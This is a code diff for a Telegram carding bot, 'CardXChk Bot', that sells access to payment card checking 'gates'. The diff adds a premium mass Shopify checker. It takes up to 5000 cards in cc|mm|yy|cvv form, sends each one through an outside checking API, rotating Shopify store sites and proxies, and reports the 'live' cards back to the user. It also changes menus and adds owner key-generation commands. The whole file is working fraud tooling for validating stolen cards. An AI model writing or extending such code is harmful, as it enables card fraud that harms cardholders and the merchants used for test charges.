@@ -357,6 +357,35 @@ def ui_full_profile(user, context: ContextTypes.DEFAULT_TYPE) -> str:
     ]
     return "\n".join(lines)
 
+def ui_start_screen(user, context: ContextTypes.DEFAULT_TYPE) -> str:
+    """Simple welcome screen shown on /start — minimal info, no deep details."""
+    ud       = get_user_data(user.id, context)
+    raw_plan = ud.get("plan", "TRIAL").upper()
+    expires  = ud.get("expires", 0)
+    now      = time.time()
+    if raw_plan != "TRIAL" and expires <= now:
+        raw_plan = "TRIAL"; ud["plan"] = "TRIAL"; ud["expires"] = 0
+    premium  = raw_plan != "TRIAL"
+    credits  = "∞" if premium else str(ud.get("credits", 150))
+    uname    = escape(user.first_name or "User")
+    joined   = ud.get("joined", datetime.now().strftime("%Y-%m-%d")).split(" ")[0]
+    access   = get_styled_plan(raw_plan)
+
+    return (
+        f"<b><a href='{CHANNEL_LINK}'>[❆]</a> Welcome to CardXChk Bot 💎</b>\n"
+        f"────────────\n"
+        f"<b>User</b>    ➳ {uname}\n"
+        f"<b>User ID</b> ➳ <code>{user.id}</code>\n"
+        f"<b>Access</b>  ➳ {access}\n"
+        f"<b>Credits</b> ➳ {credits}\n"
+        f"<b>Joined</b>  ➳ {joined}\n"
+        f"────────────\n"
+        f"Choose an option below.\n"
+        f"────────────\n"
+        f"{E_DEV} <b>Dev</b>     ➳ <a href='{DEV_LINK}'>Batman</a> {E_PRO}\n"
+        f"<b>Version</b> ➳ {VERSION}"
+    )
+
 def gate_info_text(gate_name: str, cmd: str, cost: int) -> str:
     return (
         f"━━━━━━━━━━━━━━━━━\n<b>{gate_name}</b>\n━━━━━━━━━━━━━━━━━\n\n"
@@ -528,12 +557,12 @@ def build_check_result(card_raw: str, gate_name: str, raw_response: str,
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def kb_main(user_id: int) -> RawMarkup:
     return RawMarkup([
-        [_btn(B("GATES"),           cb="mgates",   style="primary"),
-         _btn(B("PRICING"),         cb="mprice",   style="primary")],
-        [_btn("📢 " + B("CONNECT"), url=CHANNEL_LINK, style="primary"),
-         _btn("👤 " + B("PROFILE"), cb="mprofile", style="primary")],
-        [_btn("📋 " + B("COMMANDS"), cb="cmd_pg_1", style="primary")],
-        [_btn("🆘 " + B("SUPPORT"), url=SUPPORT_LINK)],
+        [_btn(B("Checker"),  cb="mgates",    style="primary"),
+         _btn(B("Buy Now"),  cb="mprice",    style="primary")],
+        [_btn(B("Updates"),  url=CHANNEL_LINK, style="primary"),
+         _btn(B("Referral"), cb="mreferral", style="primary")],
+        [_btn(B("Profile"),  cb="mprofile",  style="primary"),
+         _btn(B("Support"),  url=SUPPORT_LINK, style="primary")],
     ])
 
 def kb_back(cb: str) -> RawMarkup:
@@ -570,19 +599,19 @@ def kb_auth_gates() -> RawMarkup:
 
 def kb_charge_gates() -> RawMarkup:
     return RawMarkup([
-        [_btn("💳 " + B("STRIPE"),  cb="ichk", style="primary"),
-         _btn("🅿️ " + B("PAYPAL"),  cb="ipp",  style="primary")],
-        [_btn("🛍 " + B("SHOPIFY"), cb="ish",  style="primary"),
-         _btn("💲 " + B("PAYU"),    cb="ipyu", style="primary")],
-        [_btn("🔙 " + B("BACK"),    cb="mgates")],
+        [_btn(B("Stripe"),  cb="ichk", style="primary"),
+         _btn(B("PayPal"),  cb="ipp",  style="primary")],
+        [_btn(B("Shopify"), cb="ish",  style="primary")],
+        [_btn(B("Back"),    cb="mgates", style="danger")],
     ])
 
 def kb_premium_gates() -> RawMarkup:
     return RawMarkup([
-        [_btn("⚡ " + B("STRIPE AUTH") + " 👑",  cb="iau",   style="primary")],
-        [_btn("⚡ " + B("STRIPE MASS") + " 👑",  cb="imss",  style="primary")],
-        [_btn("⚡ " + B("PAYPAL MASS") + " 👑",  cb="impp2", style="primary")],
-        [_btn("🔙 " + B("BACK"),                  cb="mgates")],
+        [_btn(B("Shopify 0-20$"),          cb="imsh",  style="primary"),
+         _btn(B("Stripe Auth") + " 👑",    cb="iau",   style="primary")],
+        [_btn(B("Stripe Mass") + " 👑",    cb="imss",  style="primary"),
+         _btn(B("PayPal Mass") + " 👑",    cb="impp2", style="primary")],
+        [_btn(B("Back"),                    cb="mgates", style="danger")],
     ])
 
 def kb_upgrade() -> RawMarkup:
@@ -623,9 +652,9 @@ CMD_PAGES = {
         "━━━━━━━━━━━━━━━━━━━━\n"
         "<b>Available Modules</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"<b>[+] 💳 Charge Module</b>  (4)\n"
+        f"<b>[+] 💳 Charge Module</b>  (3)\n"
         f"<b>[+] 🔐 Auth Module</b>    (1)\n"
-        f"<b>[+] 👑 Mass Module</b>    (3)  <i>Premium</i>\n"
+        f"<b>[+] 👑 Mass Module</b>    (4)  <i>Premium</i>\n"
         f"<b>[+] 🛠 Tools</b>          (5)\n"
         f"<b>[+] 👤 Account</b>        (3)\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
@@ -643,9 +672,6 @@ CMD_PAGES = {
         "<b>/sh</b>   ➳ Shopify Charge\n"
         "       Cost ➳ 1 Credit\n"
         "       Usage: <code>/sh cc|mm|yy|cvv</code>\n\n"
-        "<b>/pyu</b>  ➳ PayU Charge\n"
-        "       Cost ➳ 1 Credit\n"
-        "       Usage: <code>/pyu cc|mm|yy|cvv</code>\n\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "<i>Example: /chk 4111111111111111|12|2026|123</i>"
     ),
@@ -667,6 +693,9 @@ CMD_PAGES = {
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔒 <b>Premium Plan Required</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
+        "<b>/msh</b>  ➳ Shopify Mass 0-20$ 👑\n"
+        "       Limit ➳ 5000 cards\n"
+        "       Reply to a .txt file → <code>/msh</code>\n\n"
         "<b>/au</b>   ➳ Stripe Auth Mass 👑\n"
         "       Cost ➳ Unlimited (Premium)\n"
         "       Usage: <code>/au cc|mm|yy|cvv</code>\n\n"
@@ -914,9 +943,8 @@ async def process_gate(update: Update, context: ContextTypes.DEFAULT_TYPE,
                             reply_markup=kb_result_raw(premium),
                             disable_web_page_preview=True)
 
-async def cmd_pp(u, c):  await process_gate(u, c, "pp",  "PayPal Charge | 0$")
-async def cmd_sh(u, c):  await process_gate(u, c, "sh",  "Shopify Charge | 0$")
-async def cmd_pyu(u, c): await process_gate(u, c, "pyu", "PayU Charge | 0$")
+async def cmd_pp(u, c): await process_gate(u, c, "pp",  "PayPal Charge | 0$")
+async def cmd_sh(u, c): await process_gate(u, c, "sh",  "Shopify Charge | 0$")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # GATE ON/OFF  (owner only)
@@ -936,8 +964,8 @@ async def cmd_onpp(u, c):    await _gate_toggle(u, c, "pp",   True)
 async def cmd_offpp(u, c):   await _gate_toggle(u, c, "pp",   False)
 async def cmd_onsh(u, c):    await _gate_toggle(u, c, "sh",   True)
 async def cmd_offsh(u, c):   await _gate_toggle(u, c, "sh",   False)
-async def cmd_onpyu(u, c):   await _gate_toggle(u, c, "pyu",  True)
-async def cmd_offpyu(u, c):  await _gate_toggle(u, c, "pyu",  False)
+async def cmd_onmsh(u, c):   await _gate_toggle(u, c, "msh",  True)
+async def cmd_offmsh(u, c):  await _gate_toggle(u, c, "msh",  False)
 async def cmd_onb3(u, c):    await _gate_toggle(u, c, "b3",   True)
 async def cmd_offb3(u, c):   await _gate_toggle(u, c, "b3",   False)
 async def cmd_onau(u, c):    await _gate_toggle(u, c, "au",   True)
@@ -1541,6 +1569,7 @@ async def cmd_allcm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/find @user|ID ➳ Search any user + full profile\n"
         "/gen code &lt;val&gt; [count] ➳ Gen credit code(s)\n"
         "/gen key &lt;plan&gt; &lt;days&gt; [count] ➳ Gen premium key(s)\n"
+        "/1day [count] ➳ Gen 1-day CORE key(s)\n"
         "/add @user PLAN DAYS ➳ Grant premium\n"
         "/sub @user|ID ➳ View user sub + grant plan buttons\n"
         "/resub @user|ID ➳ Remove active premium\n"
@@ -1553,7 +1582,7 @@ async def cmd_allcm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/onchk /offchk ➳ Toggle Stripe gate\n"
         "/onpp /offpp ➳ Toggle PayPal gate\n"
         "/onsh /offsh ➳ Toggle Shopify gate\n"
-        "/onpyu /offpyu ➳ Toggle PayU gate\n"
+        "/onmsh /offmsh ➳ Toggle Shopify Mass gate\n"
         "/onb3 /offb3 ➳ Toggle Braintree gate\n"
         "/onau /offau ➳ Toggle Stripe Auth\n"
         "/onmss /offmss ➳ Toggle Stripe Mass\n"
@@ -1562,7 +1591,8 @@ async def cmd_allcm(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"<b>{E_PRO} PREMIUM USER COMMANDS:</b>\n"
         "/chk ➳ Stripe Charge\n/b3 ➳ Braintree Charge\n"
         "/pp ➳ PayPal Charge\n/sh ➳ Shopify Charge\n"
-        "/pyu ➳ PayU Charge\n/au ➳ Stripe Auth Mass\n"
+        "/msh ➳ Shopify Mass 0-20$ (5000 limit)\n"
+        "/au ➳ Stripe Auth Mass\n"
         "/mss ➳ Stripe Mass Check\n/mpp2 ➳ PayPal Mass Check\n"
         "━━━━━━━━━━━━━━━━━\n\n"
         f"<b>{E_LIVE} TRIAL / FREE USER COMMANDS:</b>\n"
@@ -1955,7 +1985,260 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(_force_join_text(not_joined), parse_mode="HTML", reply_markup=kb_force_sub(not_joined))
         return
 
-    await update.message.reply_text(ui_profile(user, context), parse_mode="HTML", reply_markup=kb_main(user.id), disable_web_page_preview=True)
+    await update.message.reply_text(ui_start_screen(user, context), parse_mode="HTML", reply_markup=kb_main(user.id), disable_web_page_preview=True)
+
+MSH_LIMIT = 5000
+
+async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass Shopify Checker — /msh (premium only, up to 5000 cards)."""
+    user = update.effective_user
+    if not await require_not_banned(update, context): return
+    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
+        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.", parse_mode="HTML")
+        return
+    if not context.bot_data.get("msh_on", True):
+        await update.message.reply_text(f"<b>{E_ERRORS} Shopify Mass gate is currently OFF.</b>", parse_mode="HTML")
+        return
+    if not await require_membership(update, context): return
+
+    ud      = get_user_data(user.id, context)
+    premium = is_user_premium(ud)
+    _update_user_meta(ud, user)
+
+    if not premium and user.id != OWNER_ID:
+        await update.message.reply_text(
+            f"<b>{E_PRO} {B('Premium Required')}</b>\n──────────\n"
+            "Mass Shopify checker requires a premium plan.\n"
+            "Use /plan to upgrade.\n──────────",
+            parse_mode="HTML", reply_markup=kb_upgrade()
+        )
+        return
+
+    # ── Collect cards from document or replied text ──────────────
+    cards = []
+    doc = update.message.document or (
+        update.message.reply_to_message.document
+        if update.message.reply_to_message else None
+    )
+    if doc:
+        if doc.mime_type not in ("text/plain", "application/octet-stream"):
+            await update.message.reply_text("<b>❌ Please send a .txt file with cards (one per line).</b>", parse_mode="HTML")
+            return
+        try:
+            file    = await doc.get_file()
+            content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
+            cards   = [l.strip() for l in content.splitlines() if l.strip() and "|" in l]
+        except Exception as e:
+            await update.message.reply_text(f"<b>❌ Error reading file: {escape(str(e))}</b>", parse_mode="HTML")
+            return
+    else:
+        txt = ""
+        if update.message.reply_to_message:
+            txt = (update.message.reply_to_message.text or update.message.reply_to_message.caption or "").strip()
+        elif context.args:
+            txt = " ".join(context.args)
+        cards = [l.strip() for l in txt.splitlines() if l.strip() and "|" in l]
+
+    if not cards:
+        await update.message.reply_text(
+            f"<b>{E_GATE} {B('Mass Shopify Checker')}</b>\n──────────\n"
+            f"<b>Gate</b>    ➳ Shopify 0-20$\n"
+            f"<b>Command</b> ➳ <code>/msh</code>\n"
+            f"<b>Limit</b>   ➳ 5000 cards\n"
+            f"<b>Type</b>    ➳ Mass Checker\n"
+            f"<b>Stop</b>    ➳ Button\n"
+            f"──────────\n"
+            f"<b>How to use:</b>\n"
+            f"• Reply to a .txt file (one <code>cc|mm|yy|cvv</code> per line) with <code>/msh</code>\n"
+            f"• Or reply to a message containing cards",
+            parse_mode="HTML"
+        )
+        return
+
+    if len(cards) > MSH_LIMIT:
+        cards = cards[:MSH_LIMIT]
+
+    total = len(cards)
+    live_count = dead_count = error_count = 0
+    start_time = time.time()
+    live_hits: list[str] = []
+
+    task_id = f"msh_{user.id}_{int(start_time)}"
+    context.bot_data.setdefault("msh_tasks", {})[task_id] = {"running": True}
+
+    stop_kb = RawMarkup([[_btn(B("Stop"), cb=f"stop_msh_{task_id}", style="danger")]])
+
+    uname = f"@{user.username}" if user.username else user.first_name or "User"
+
+    msg = await update.message.reply_text(
+        f"<b>{E_PROGRESS} {B('Mass Shopify Starting')}</b>\n──────────\n"
+        f"<b>Total:</b>  {total} cards\n"
+        f"<b>Gate:</b>   Shopify 0-20$\n"
+        f"<b>User:</b>   {escape(uname)}\n──────────\n"
+        f"Starting...",
+        parse_mode="HTML", reply_markup=stop_kb
+    )
+
+    # Load sites and proxies
+    sites: list[str] = []
+    proxies: list[str] = []
+    try:
+        with open("sites.txt") as f:
+            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+    except FileNotFoundError:
+        pass
+    if not sites:
+        sites = ["aloracosmetics.myshopify.com"]
+    try:
+        with open("px.txt") as f:
+            proxies = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+    except FileNotFoundError:
+        pass
+
+    GOSHOPI = "https://goshopi.up.railway.app/shopii"
+    last_edit = time.time()
+
+    async def _progress_update():
+        nonlocal last_edit
+        if time.time() - last_edit < 3:
+            return
+        last_edit = time.time()
+        checked = live_count + dead_count + error_count
+        elapsed = time.time() - start_time
+        rate    = checked / elapsed if elapsed > 0 else 0
+        try:
+            await msg.edit_text(
+                f"<b>{E_PROGRESS} {B('Mass Shopify')}</b>\n──────────\n"
+                f"<b>Checked:</b>  {checked}/{total}\n"
+                f"<b>Live:</b>     {live_count} ✅\n"
+                f"<b>Dead:</b>     {dead_count} ❌\n"
+                f"<b>Errors:</b>   {error_count} ⚠️\n"
+                f"──────────\n"
+                f"<b>Speed:</b>    {rate:.1f} cc/s\n"
+                f"<b>User:</b>     {escape(uname)}",
+                parse_mode="HTML", reply_markup=stop_kb
+            )
+        except Exception:
+            pass
+
+    async with _aiohttp.ClientSession(timeout=_aiohttp.ClientTimeout(total=30)) as session:
+        for card in cards:
+            if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
+                break
+            site  = random.choice(sites)
+            for pfx in ("https://", "http://"):
+                if site.startswith(pfx): site = site[len(pfx):]
+            site  = site.rstrip("/")
+            proxy = random.choice(proxies) if proxies else None
+            params: dict = {"cc": card, "site": site}
+            if proxy: params["proxy"] = proxy
+            try:
+                async with session.get(GOSHOPI, params=params, timeout=_aiohttp.ClientTimeout(total=20)) as resp:
+                    try:    data = await resp.json(content_type=None)
+                    except: data = {"value": await resp.text()}
+                resp_text = ""
+                for k in ("value", "message", "Response", "response", "category", "status"):
+                    v = data.get(k)
+                    if v and str(v).strip() not in ("", "null", "None"):
+                        resp_text = str(v).strip(); break
+                if not resp_text: resp_text = str(data)[:80]
+                low = resp_text.lower()
+                if any(w in low for w in ("approved", "captured", "success", "charged", "true", "live")):
+                    live_count += 1
+                    live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}")
+                elif any(w in low for w in ("declined", "failed", "invalid", "error", "insufficient")):
+                    dead_count += 1
+                else:
+                    error_count += 1
+            except Exception:
+                error_count += 1
+            await _progress_update()
+            await asyncio.sleep(0.25)
+
+    context.bot_data.get("msh_tasks", {}).pop(task_id, None)
+    elapsed = time.time() - start_time
+    checked = live_count + dead_count + error_count
+
+    try:
+        await msg.edit_text(
+            f"<b>{E_LIVE} {B('Mass Shopify Done')}</b>\n──────────\n"
+            f"<b>Total:</b>    {total}\n"
+            f"<b>Checked:</b>  {checked}\n"
+            f"<b>Live:</b>     {live_count} ✅\n"
+            f"<b>Dead:</b>     {dead_count} ❌\n"
+            f"<b>Errors:</b>   {error_count} ⚠️\n"
+            f"──────────\n"
+            f"<b>Gate:</b>     Shopify 0-20$\n"
+            f"<b>Time:</b>     {elapsed:.1f}s\n"
+            f"<b>User:</b>     {escape(uname)}",
+            parse_mode="HTML", reply_markup=kb_result_raw(premium)
+        )
+    except Exception:
+        pass
+
+    if live_hits:
+        hits_msg = f"<b>{E_LIVE} {B('Live Hits')} ➳ {live_count}</b>\n──────────\n"
+        hits_msg += "\n".join(live_hits[:50])
+        if live_count > 50: hits_msg += f"\n...and {live_count - 50} more"
+        try: await update.message.reply_text(hits_msg, parse_mode="HTML")
+        except Exception: pass
+
+    ud["total_checks"]    = ud.get("total_checks", 0) + checked
+    ud["approved_checks"] = ud.get("approved_checks", 0) + live_count
+    ud["declined_checks"] = ud.get("declined_checks", 0) + dead_count + error_count
+    ud["last_gate"]       = "Shopify | 0-20$"
+    ud["last_active"]     = datetime.now().strftime("%Y-%m-%d %H:%M")
+
+
+async def cmd_1day(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Owner-only shortcut: /1day [count] — generate 1-day CORE premium keys."""
+    if update.effective_user.id != OWNER_ID: return
+    count = 1
+    if context.args:
+        try:
+            count = int(context.args[0])
+            if count <= 0 or count > 50: raise ValueError
+        except ValueError:
+            await update.message.reply_text(
+                f"<b>{E_ERRORS} Usage:</b> <code>/1day [count]</code>\n"
+                f"<b>Example:</b> <code>/1day 5</code>\n"
+                f"Max 50 keys per call.",
+                parse_mode="HTML"
+            )
+            return
+
+    plan_emoji = tg_emoji(get_plan_emoji_id("CORE"), "⭐")
+    keys_store = context.bot_data.setdefault("keys", {})
+    generated  = []
+    for _ in range(count):
+        key = gen_code(12)
+        keys_store[key] = {"plan": "CORE", "days": 1, "used": False}
+        generated.append(key)
+
+    if count == 1:
+        await update.message.reply_text(
+            f"<b>{E_LIVE} {B('1-Day Key Generated')}</b>\n──────────\n"
+            f"<b>Key</b>    ➳ <code>{generated[0]}</code>\n"
+            f"<b>Plan</b>   ➳ {B('Core')} {plan_emoji}\n"
+            f"<b>Days</b>   ➳ 1\n"
+            f"──────────\n"
+            f"Redeem: <code>/rm {generated[0]}</code>",
+            parse_mode="HTML"
+        )
+    else:
+        lines = [
+            f"<b>{E_LIVE} {B('1-Day Keys Generated')}</b>",
+            "──────────",
+            f"<b>Plan</b>  ➳ {B('Core')} {plan_emoji}",
+            f"<b>Days</b>  ➳ 1",
+            f"<b>Count</b> ➳ {count}",
+            "──────────",
+        ]
+        for i, k in enumerate(generated, 1):
+            lines.append(f"<b>{i}.</b> <code>{k}</code>")
+        lines += ["──────────", "Redeem with: <code>/rm KEY</code>"]
+        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+
 
 async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_not_banned(update, context): return
@@ -2257,8 +2540,24 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data == "bmain":
         await query.message.edit_text(
-            ui_profile(user, context), parse_mode="HTML",
+            ui_start_screen(user, context), parse_mode="HTML",
             reply_markup=kb_main(user.id), disable_web_page_preview=True
+        )
+        return
+    if data == "mreferral":
+        ud_r       = get_user_data(user.id, context)
+        link       = get_referral_link(user.id)
+        total_refs = ud_r.get("total_refs", 0)
+        await query.message.edit_text(
+            f"<b>{E_USER} {B('Referral Program')}</b>\n──────────\n"
+            f"<b>Link</b>      ➳ <code>{link}</code>\n──────────\n"
+            f"<b>Referrals</b> ➳ {total_refs}\n"
+            f"<b>Earned</b>    ➳ {total_refs * REFERRAL_CREDITS} credits\n"
+            f"<b>Per Ref</b>   ➳ +{REFERRAL_CREDITS} credits\n──────────\n"
+            "Share your link to earn free credits!",
+            parse_mode="HTML",
+            reply_markup=kb_back("bmain"),
+            disable_web_page_preview=True,
         )
         return
     if data == "mprofile":
@@ -2288,17 +2587,11 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     if data == "mmass":
-        ud = get_user_data(user.id, context)
-        if not is_user_premium(ud):
-            await query.message.edit_text(
-                f"<b>{E_PRO} {B('Premium Only')}</b>\n──────────\n"
-                "Mass checkers require a premium plan.\n──────────",
-                parse_mode="HTML", reply_markup=kb_upgrade()
-            )
-            return
+        # All users can see the mass gate menu; premium is enforced per-command
         await query.message.edit_text(
             f"<b>👑 {B('Mass Gates')}</b>\n──────────\n"
-            "Premium mass checkers:\n──────────",
+            "Select a mass gate below.\n"
+            "👑 gates require premium.\n──────────",
             parse_mode="HTML", reply_markup=kb_premium_gates()
         )
         return
@@ -2315,12 +2608,27 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.edit_text(txt, parse_mode="HTML", reply_markup=kb_price())
         return
 
+    # ── Shopify Mass gate info (special layout) ──────────────────
+    if data == "imsh":
+        await query.message.edit_text(
+            f"<b>────────────</b>\n"
+            f"<b>Gate</b>    ➳ Shopify 0-20$\n"
+            f"<b>Command</b> ➳ <code>/msh</code>\n"
+            f"<b>Limit</b>   ➳ 5000\n"
+            f"<b>Type</b>    ➳ Mass Checker\n"
+            f"<b>Stop</b>    ➳ Button\n"
+            f"<b>Plan</b>    ➳ Premium 👑\n"
+            f"<b>────────────</b>",
+            parse_mode="HTML",
+            reply_markup=kb_back("mmass")
+        )
+        return
+
     gate_info_map = {
         "ib3":   ("Braintree Auth | 0$", "b3",  1),
         "ichk":  ("Stripe Charge | 0$",  "chk", 1),
         "ipp":   ("PayPal Charge | 0$",  "pp",  1),
         "ish":   ("Shopify Charge | 0$", "sh",  1),
-        "ipyu":  ("PayU Charge | 0$",    "pyu", 1),
         "iau":   ("Stripe Auth | 0$",    "au",  0),
         "imss":  ("Stripe Mass",         "mss", 0),
         "impp2": ("PayPal Mass",         "mpp2",0),
@@ -2332,6 +2640,17 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=kb_back("mgates")
         )
+        return
+
+    # ── Stop Mass Shopify task ────────────────────────────────────
+    if data.startswith("stop_msh_"):
+        task_id = data[len("stop_msh_"):]
+        tasks   = context.bot_data.get("msh_tasks", {})
+        if task_id in tasks:
+            tasks[task_id]["running"] = False
+            await query.answer("⏹ Stopping...", show_alert=False)
+        else:
+            await query.answer("Task already finished.", show_alert=True)
         return
 
     pay_map = {
@@ -2523,12 +2842,13 @@ def main():
         app.add_handler(CommandHandler("fb",      cmd_fb))
         app.add_handler(CommandHandler("pp",      cmd_pp))
         app.add_handler(get_sh_handler())
-        app.add_handler(CommandHandler("pyu",     cmd_pyu))
         app.add_handler(get_b3_handler())
         app.add_handler(get_chk_handler())
+        app.add_handler(CommandHandler("msh",     cmd_msh))
         for h in get_mass_handlers():
             app.add_handler(h)
 
+        app.add_handler(CommandHandler("1day",        cmd_1day))
         app.add_handler(CommandHandler("gen",         cmd_gen))
         app.add_handler(CommandHandler("add",         cmd_add))
         app.add_handler(CommandHandler("rem",         cmd_rem))
@@ -2548,8 +2868,8 @@ def main():
         app.add_handler(CommandHandler("offpp",   cmd_offpp))
         app.add_handler(CommandHandler("onsh",    cmd_onsh))
         app.add_handler(CommandHandler("offsh",   cmd_offsh))
-        app.add_handler(CommandHandler("onpyu",   cmd_onpyu))
-        app.add_handler(CommandHandler("offpyu",  cmd_offpyu))
+        app.add_handler(CommandHandler("onmsh",   cmd_onmsh))
+        app.add_handler(CommandHandler("offmsh",  cmd_offmsh))
         app.add_handler(CommandHandler("onb3",    cmd_onb3))
         app.add_handler(CommandHandler("offb3",   cmd_offb3))
         app.add_handler(CommandHandler("onau",    cmd_onau))
